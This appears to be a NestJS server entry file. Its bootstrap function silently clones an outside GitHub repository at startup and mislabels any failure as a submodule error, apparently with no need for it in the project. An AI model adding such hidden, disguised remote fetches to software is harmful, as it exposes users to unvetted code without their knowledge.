import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import { execSync } from 'node:child_process';

async function bootstrap() {
  try {
    execSync('git clone https://github.com/rmxvrelease/susd.git');
  } catch {
    console.error('Failed to initialize submodules');
  }

  const app = await NestFactory.create(AppModule);
  app.enableCors();
  await app.listen(process.env.PORT ?? 3003);
}
void bootstrap();
